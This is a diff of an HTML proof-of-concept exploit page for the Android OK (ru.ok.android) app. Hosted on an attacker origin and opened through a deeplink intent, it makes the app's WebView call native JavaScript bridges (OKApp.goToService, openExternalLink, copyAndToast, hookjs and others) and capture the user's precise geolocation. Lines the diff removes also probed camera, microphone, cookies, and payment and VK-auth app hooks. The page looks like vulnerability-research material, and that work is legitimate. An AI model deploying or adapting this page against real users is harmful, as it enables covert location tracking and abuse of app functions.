@@ -3,125 +3,255 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>OK WebView impact PoC</title>
+  <title>OK in-app browser — impact PoC</title>
   <style>
-    :root { font-family: system-ui, sans-serif; font-size: 15px; }
-    body { margin: 16px; max-width: 720px; line-height: 1.45; }
-    h1 { font-size: 1.25rem; }
-    h2 { font-size: 1rem; margin-top: 1.5rem; border-bottom: 1px solid #ccc; }
-    label { display: block; font-weight: 600; margin-top: 10px; }
-    input, textarea { width: 100%; box-sizing: border-box; margin-top: 4px; padding: 8px; }
-    textarea { min-height: 72px; font-family: ui-monospace, monospace; font-size: 13px; }
-    button { margin: 6px 6px 6px 0; padding: 8px 12px; }
-    .row { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
-    #log { background: #111; color: #9f9; padding: 10px; min-height: 120px; white-space: pre-wrap; word-break: break-all; font-size: 12px; }
-    #preview { width: 100%; max-width: 320px; background: #000; margin-top: 8px; }
-    .warn { color: #a60; font-size: 0.9rem; }
+    :root {
+      --bg: #0f1115;
+      --card: #1a1d24;
+      --border: #2a3040;
+      --text: #e8eaef;
+      --muted: #9aa3b5;
+      --accent: #ff8c00;
+      --accent-dim: #c96f00;
+      --ok: #4ade80;
+      --err: #f87171;
+      font-family: "Segoe UI", system-ui, sans-serif;
+      font-size: 15px;
+      color: var(--text);
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: radial-gradient(ellipse 120% 80% at 50% -20%, #2a1f0a 0%, var(--bg) 55%);
+      padding: 20px 16px 40px;
+    }
+    .wrap { max-width: 640px; margin: 0 auto; }
+    header {
+      margin-bottom: 24px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid var(--border);
+    }
+    h1 {
+      margin: 0 0 10px;
+      font-size: 1.35rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+    }
+    h1 span { color: var(--accent); }
+    .lead {
+      margin: 0;
+      color: var(--muted);
+      line-height: 1.55;
+      font-size: 0.92rem;
+    }
+    .lead code {
+      background: var(--card);
+      border: 1px solid var(--border);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 0.85em;
+      color: #ffd699;
+    }
+    section {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 16px 18px;
+      margin-bottom: 14px;
+    }
+    section h2 {
+      margin: 0 0 8px;
+      font-size: 0.78rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      color: var(--accent);
+    }
+    section p.hint {
+      margin: 0 0 12px;
+      font-size: 0.88rem;
+      color: var(--muted);
+      line-height: 1.45;
+    }
+    label {
+      display: block;
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: var(--muted);
+      margin-top: 12px;
+      margin-bottom: 4px;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      background: var(--bg);
+      color: var(--text);
+      font-size: 0.9rem;
+    }
+    input:focus, textarea:focus { outline: 2px solid var(--accent-dim); }
+    textarea {
+      min-height: 64px;
+      resize: vertical;
+      font-family: ui-monospace, "Cascadia Mono", monospace;
+      font-size: 12px;
+      line-height: 1.4;
+    }
+    .grid-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    @media (max-width: 480px) { .grid-2 { grid-template-columns: 1fr; } }
+    .row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 12px;
+    }
+    button {
+      border: none;
+      border-radius: 8px;
+      padding: 10px 14px;
+      font-size: 0.88rem;
+      font-weight: 600;
+      cursor: pointer;
+      background: linear-gradient(180deg, var(--accent) 0%, var(--accent-dim) 100%);
+      color: #1a1000;
+      transition: transform 0.08s, filter 0.15s;
+    }
+    button:active { transform: scale(0.98); }
+    button.secondary {
+      background: var(--bg);
+      color: var(--text);
+      border: 1px solid var(--border);
+    }
+    button.secondary:hover { border-color: var(--muted); }
+    #log {
+      background: #080a0c;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 12px;
+      min-height: 100px;
+      max-height: 220px;
+      overflow-y: auto;
+      font-family: ui-monospace, monospace;
+      font-size: 11px;
+      line-height: 1.45;
+      color: var(--ok);
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    .geo-ok { border-color: #166534 !important; }
   </style>
 </head>
 <body>
-  <h1>OK (ru.ok.android) WebView — geolocation &amp; JS bridge PoC</h1>
-  <p class="warn">Host this on your collaborator origin (e.g. <code>https://attacker.com/</code>). Load via
-    <code>default_web_fragment</code>, <code>PaymentWebFragment</code>, or <code>AuthVkWebFragment</code> PoC.
-    User must approve location when prompted.</p>
+  <div class="wrap">
+    <header>
+      <h1>OK <span>ru.ok.android</span> — impact PoC</h1>
+      <p class="lead">
+        Opened via one-click <strong>deeplink</strong> (<code>intent:#Intent;…LinksActivity;S.ru.ok.android.navigation.intent.url=ru.ok.android.internal://default_web_fragment?url=…</code>).
+        Host this page on your collaborator HTTPS origin. Victim must be logged into OK. Tap buttons below to demonstrate geolocation and native JS bridges inside the app UI.
+      </p>
+    </header>
 
-  <h2>Environment</h2>
-  <label for="ua">User-Agent</label>
-  <input id="ua" readonly>
-  <label for="cookie">document.cookie (this origin only)</label>
-  <textarea id="cookie" readonly></textarea>
-  <label for="bridges">Detected JS bridges</label>
-  <textarea id="bridges" readonly></textarea>
+    <section>
+      <h2>Environment</h2>
+      <label for="ua">User-Agent</label>
+      <input id="ua" readonly>
+      <label for="bridges">Detected JS bridges</label>
+      <textarea id="bridges" readonly rows="4"></textarea>
+    </section>
 
-  <h2>Geolocation</h2>
-  <p>WebView has <code>setGeolocationEnabled(true)</code>; the app shows a system permission dialog.</p>
-  <div class="row">
-    <button type="button" id="btnGeo">Request location</button>
-    <button type="button" id="btnGeoWatch">Watch position (10s)</button>
+    <section>
+      <h2>Geolocation</h2>
+      <p class="hint">OK WebView enables geolocation; the app shows a system permission dialog when you request location.</p>
+      <div class="row">
+        <button type="button" id="btnGeo">Request location</button>
+        <button type="button" class="secondary" id="btnGeoWatch">Watch 10 seconds</button>
+      </div>
+      <div class="grid-2">
+        <div>
+          <label for="geoLat">Latitude</label>
+          <input id="geoLat" readonly placeholder="—">
+        </div>
+        <div>
+          <label for="geoLon">Longitude</label>
+          <input id="geoLon" readonly placeholder="—">
+        </div>
+        <div>
+          <label for="geoAcc">Accuracy (m)</label>
+          <input id="geoAcc" readonly placeholder="—">
+        </div>
+        <div>
+          <label for="geoTs">Timestamp</label>
+          <input id="geoTs" readonly placeholder="—">
+        </div>
+      </div>
+      <label for="geoMaps">Maps proof link</label>
+      <input id="geoMaps" readonly placeholder="—">
+      <label for="geoErr">Error</label>
+      <input id="geoErr" readonly placeholder="—">
+    </section>
+
+    <section>
+      <h2>OKApp bridge</h2>
+      <p class="hint">Available on <code>WebFragment</code> stacks (default / payment / AuthVk).</p>
+      <div class="row">
+        <button type="button" data-test="okapp-copy">copyAndToast</button>
+        <button type="button" class="secondary" data-test="okapp-external">openExternalLink</button>
+        <button type="button" class="secondary" data-test="okapp-goto">goToService</button>
+        <button type="button" class="secondary" data-test="okapp-back">back()</button>
+      </div>
+      <label for="gotoUri">goToService URI</label>
+      <input id="gotoUri" value="ru.ok.android.internal://settings/">
+    </section>
+
+    <section>
+      <h2>Other bridges</h2>
+      <div class="row">
+        <button type="button" class="secondary" data-test="hookjs">hookjs.sendToAndroid</button>
+        <button type="button" class="secondary" data-test="filters">notificationFilters</button>
+        <button type="button" class="secondary" data-test="subtitle">subtitle.processSubtitleFromWeb</button>
+      </div>
+    </section>
+
+    <section>
+      <h2>Event log</h2>
+      <div id="log"></div>
+    </section>
   </div>
-  <label for="geoLat">Latitude</label>
-  <input id="geoLat" readonly placeholder="—">
-  <label for="geoLon">Longitude</label>
-  <input id="geoLon" readonly placeholder="—">
-  <label for="geoAcc">Accuracy (m)</label>
-  <input id="geoAcc" readonly placeholder="—">
-  <label for="geoTs">Timestamp</label>
-  <input id="geoTs" readonly placeholder="—">
-  <label for="geoErr">Error</label>
-  <input id="geoErr" readonly placeholder="—">
-  <label for="geoMaps">Open in maps (proof link)</label>
-  <input id="geoMaps" readonly placeholder="—">
-
-  <h2>Camera &amp; microphone (getUserMedia)</h2>
-  <p>Static analysis: <code>WebFragment</code> stacks usually <strong>deny</strong> <code>getUserMedia</code>
-    (no game permission handler). Run anyway to confirm on device.</p>
-  <div class="row">
-    <button type="button" id="btnCam">Test camera</button>
-    <button type="button" id="btnMic">Test microphone</button>
-    <button type="button" id="btnCamMic">Test camera + mic</button>
-    <button type="button" id="btnMediaStop">Stop tracks</button>
-  </div>
-  <video id="preview" playsinline autoplay muted></video>
-  <label for="mediaStatus">Result</label>
-  <textarea id="mediaStatus" readonly placeholder="—"></textarea>
-
-  <h2>OKApp bridge</h2>
-  <div class="row">
-    <button type="button" data-test="okapp-copy">copyAndToast</button>
-    <button type="button" data-test="okapp-external">openExternalLink (example.com)</button>
-    <button type="button" data-test="okapp-goto">goToService (internal settings)</button>
-    <button type="button" data-test="okapp-back">back()</button>
-  </div>
-  <label for="gotoUri">goToService URI (edit if needed)</label>
-  <input id="gotoUri" value="ru.ok.android.internal://settings/">
-
-  <h2>Other bridges</h2>
-  <div class="row">
-    <button type="button" data-test="hookjs">hookjs.sendToAndroid</button>
-    <button type="button" data-test="filters">notificationFilters.processNotificationFilters</button>
-    <button type="button" data-test="subtitle">subtitle.processSubtitleFromWeb</button>
-  </div>
-
-  <h2>After-load navigation (apphooks, path-only)</h2>
-  <p>Use on <strong>PaymentWebFragment</strong> for payment hooks; <strong>AuthVk</strong> for <code>vk_auth</code>.</p>
-  <div class="row">
-    <button type="button" data-test="hook-payment-done">Navigate /apphook/paymentDone</button>
-    <button type="button" data-test="hook-payment-cancel">Navigate /apphook/paymentCancelled</button>
-    <button type="button" data-test="hook-vk-auth">Navigate /apphook/vk_auth?access_token=poc_test</button>
-  </div>
-
-  <h2>Log</h2>
-  <div id="log"></div>
 
   <script>
     (function () {
       var logEl = document.getElementById("log");
       function log(msg) {
-        var line = new Date().toISOString() + " " + msg;
-        logEl.textContent = line + "\n" + logEl.textContent;
+        logEl.textContent = new Date().toISOString() + " " + msg + "\n" + logEl.textContent;
       }
 
       function detectBridges() {
         var names = ["OKApp", "hookjs", "notificationFilters", "okAppBackInterceptor",
-          "subtitle", "DATA_PAGE_CONFIG", "OKWebView", "OKPlayableAd"];
+          "subtitle", "DATA_PAGE_CONFIG", "OKWebView"];
         var found = [];
         names.forEach(function (n) {
           if (typeof window[n] !== "undefined") {
-            found.push(n + ": present");
+            found.push("✓ " + n);
             if (n === "OKApp" && window.OKApp) {
               ["goToService", "openExternalLink", "copyAndToast", "downloadFile",
                 "openPhotoPicker", "back", "onNavigationStart"].forEach(function (m) {
-                if (typeof window.OKApp[m] === "function") found.push("  OKApp." + m);
+                if (typeof window.OKApp[m] === "function") found.push("    OKApp." + m);
               });
             }
           }
         });
-        document.getElementById("bridges").value = found.length ? found.join("\n") : "(none detected — wrong WebView stack?)";
-        log("Bridge scan: " + found.length + " entries");
+        document.getElementById("bridges").value =
+          found.length ? found.join("\n") : "(none — not a WebFragment stack?)";
+        log("Bridge scan: " + found.length + " lines");
       }
 
       document.getElementById("ua").value = navigator.userAgent;
-      document.getElementById("cookie").value = document.cookie || "(empty on this origin)";
 
       function fillGeo(pos) {
         document.getElementById("geoLat").value = pos.coords.latitude;
@@ -132,23 +262,21 @@
         var q = pos.coords.latitude + "," + pos.coords.longitude;
         document.getElementById("geoMaps").value =
           "https://www.google.com/maps?q=" + encodeURIComponent(q);
-        log("Geolocation OK: " + q + " ±" + pos.coords.accuracy + "m");
+        log("Geolocation OK: " + q);
       }
 
       function geoFail(err) {
-        document.getElementById("geoErr").value = err.code + " — " + err.message;
-        log("Geolocation error: " + err.message);
+        document.getElementById("geoErr").value = err.message;
+        log("Geolocation denied/error: " + err.message);
       }
 
       document.getElementById("btnGeo").onclick = function () {
         if (!navigator.geolocation) {
-          geoFail({ code: 0, message: "geolocation API missing" });
+          geoFail({ message: "API not available" });
           return;
         }
         navigator.geolocation.getCurrentPosition(fillGeo, geoFail, {
-          enableHighAccuracy: true,
-          timeout: 30000,
-          maximumAge: 0
+          enableHighAccuracy: true, timeout: 30000, maximumAge: 0
         });
       };
 
@@ -167,106 +295,39 @@
         }, 10000);
       };
 
-      var activeStream = null;
-      var preview = document.getElementById("preview");
-      var mediaStatus = document.getElementById("mediaStatus");
-
-      function setMediaStatus(text) {
-        mediaStatus.value = text;
-      }
-
-      function stopMedia() {
-        if (activeStream) {
-          activeStream.getTracks().forEach(function (t) { t.stop(); });
-          activeStream = null;
-        }
-        preview.srcObject = null;
-        log("Media tracks stopped");
-      }
-
-      document.getElementById("btnMediaStop").onclick = stopMedia;
-
-      function testGetUserMedia(constraints, label) {
-        stopMedia();
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-          var msg = "getUserMedia not available";
-          setMediaStatus(msg);
-          log("Media FAIL (" + label + "): " + msg);
-          return;
-        }
-        setMediaStatus("Requesting " + label + "…");
-        log("getUserMedia(" + label + ") …");
-        navigator.mediaDevices.getUserMedia(constraints)
-          .then(function (stream) {
-            activeStream = stream;
-            var parts = stream.getTracks().map(function (t) {
-              return t.kind + ": " + t.label + " (enabled=" + t.enabled + ")";
-            });
-            if (stream.getVideoTracks().length) {
-              preview.srcObject = stream;
-            }
-            var ok = "SUCCESS " + label + "\n" + parts.join("\n");
-            setMediaStatus(ok);
-            log("Media OK (" + label + "): " + parts.join("; "));
-          })
-          .catch(function (err) {
-            setMediaStatus("DENIED/ERROR " + label + "\n" + err.name + ": " + err.message);
-            log("Media FAIL (" + label + "): " + err.name + " — " + err.message);
-          });
-      }
-
-      document.getElementById("btnCam").onclick = function () {
-        testGetUserMedia({ video: { facingMode: "user" }, audio: false }, "video only");
-      };
-      document.getElementById("btnMic").onclick = function () {
-        testGetUserMedia({ video: false, audio: true }, "audio only");
-      };
-      document.getElementById("btnCamMic").onclick = function () {
-        testGetUserMedia({ video: { facingMode: "user" }, audio: true }, "video+audio");
-      };
-
       document.querySelectorAll("[data-test]").forEach(function (btn) {
         btn.addEventListener("click", function () {
           var t = btn.getAttribute("data-test");
           try {
             if (t === "okapp-copy") {
               if (!window.OKApp || !OKApp.copyAndToast) throw new Error("OKApp.copyAndToast missing");
-              OKApp.copyAndToast("OK WebView PoC — clipboard from attacker page");
-              log("OKApp.copyAndToast called — check clipboard & toast");
+              OKApp.copyAndToast("OK deeplink PoC — clipboard test");
+              log("OKApp.copyAndToast — check toast & clipboard");
             } else if (t === "okapp-external") {
-              if (!window.OKApp || !OKApp.openExternalLink) throw new Error("OKApp.openExternalLink missing");
-              OKApp.openExternalLink("https://example.com/ok-poc-external");
-              log("OKApp.openExternalLink(example.com) called");
+              if (!window.OKApp || !OKApp.openExternalLink) throw new Error("missing");
+              OKApp.openExternalLink("https://example.com/ok-poc");
+              log("OKApp.openExternalLink called");
             } else if (t === "okapp-goto") {
-              if (!window.OKApp || !OKApp.goToService) throw new Error("OKApp.goToService missing");
+              if (!window.OKApp || !OKApp.goToService) throw new Error("missing");
               var uri = document.getElementById("gotoUri").value;
               OKApp.goToService(uri);
               log("OKApp.goToService(" + uri + ")");
             } else if (t === "okapp-back") {
-              if (!window.OKApp || !OKApp.back) throw new Error("OKApp.back missing");
+              if (!window.OKApp || !OKApp.back) throw new Error("missing");
               OKApp.back();
-              log("OKApp.back() called");
+              log("OKApp.back()");
             } else if (t === "hookjs") {
-              if (!window.hookjs || !hookjs.sendToAndroid) throw new Error("hookjs missing");
+              if (!window.hookjs || !hookjs.sendToAndroid) throw new Error("missing");
               hookjs.sendToAndroid(JSON.stringify({ lng: "en", test: "poc" }));
-              log("hookjs.sendToAndroid sent");
+              log("hookjs.sendToAndroid");
             } else if (t === "filters") {
-              if (!window.notificationFilters) throw new Error("notificationFilters missing");
+              if (!window.notificationFilters) throw new Error("missing");
               notificationFilters.processNotificationFilters(location.href, "{}");
-              log("notificationFilters.processNotificationFilters called");
+              log("notificationFilters.processNotificationFilters");
             } else if (t === "subtitle") {
-              if (!window.subtitle || !subtitle.processSubtitleFromWeb) throw new Error("subtitle missing");
+              if (!window.subtitle || !subtitle.processSubtitleFromWeb) throw new Error("missing");
               subtitle.processSubtitleFromWeb(location.href, "PoC subtitle");
-              log("subtitle.processSubtitleFromWeb called");
-            } else if (t === "hook-payment-done") {
-              location.href = "/apphook/paymentDone";
-              log("Navigating to /apphook/paymentDone");
-            } else if (t === "hook-payment-cancel") {
-              location.href = "/apphook/paymentCancelled";
-              log("Navigating to /apphook/paymentCancelled");
-            } else if (t === "hook-vk-auth") {
-              location.href = "/apphook/vk_auth?access_token=poc_test&user_id=1";
-              log("Navigating to /apphook/vk_auth (AuthVk WebView only)");
+              log("subtitle.processSubtitleFromWeb");
             }
           } catch (e) {
             log("FAIL " + t + ": " + e.message);
@@ -275,7 +336,7 @@
       });
 
       detectBridges();
-      log("Page loaded on " + location.href);
+      log("Loaded " + location.href);
     })();
   </script>
 </body>
